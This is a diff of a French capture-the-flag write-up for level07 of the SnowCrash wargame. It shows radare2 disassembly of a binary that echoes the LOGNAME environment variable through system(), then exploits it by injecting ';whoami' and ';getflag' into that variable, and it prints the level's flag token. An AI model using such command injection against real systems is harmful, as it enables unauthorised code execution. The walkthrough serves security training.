@@ -1,6 +1,12 @@
+# LEVEL 07
+
+### Reconnaissance
+
 On se connecte sur l'utilisateur level07
 
 On tombe sur un binaire, on l'analyse avec r2:
+
+```
 [0x08048460]> pdf@main
             ; DATA XREF from entry0 @ 0x8048477
 ┌ 141: int main (int argc, char **argv, char **envp);
@@ -44,17 +50,20 @@ On tombe sur un binaire, on l'analyse avec r2:
 │           0x0804859a      e871feffff     call sym.imp.system         ; int system(const char *string)
 │           0x0804859f      c9             leave                       ; /home/user/level07/level07.c:24
 └           0x080485a0      c3             ret
-
+```
 
 On voit qu'il va chercher LOGNAME dans les variables d'environnements et il l'imprime avec echo.
 
-On va donc mettre notre variable d'environnement :)
+### Exploitation
 
+On va donc mettre **notre** variable d'environnement :)
 
+```
 level07@SnowCrash:~$ env -i LOGNAME=";whoami" ./level07 
 flag07
 level07@SnowCrash:~$ env -i LOGNAME=";getflag" ./level07 
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
 
 Et voila :)
 
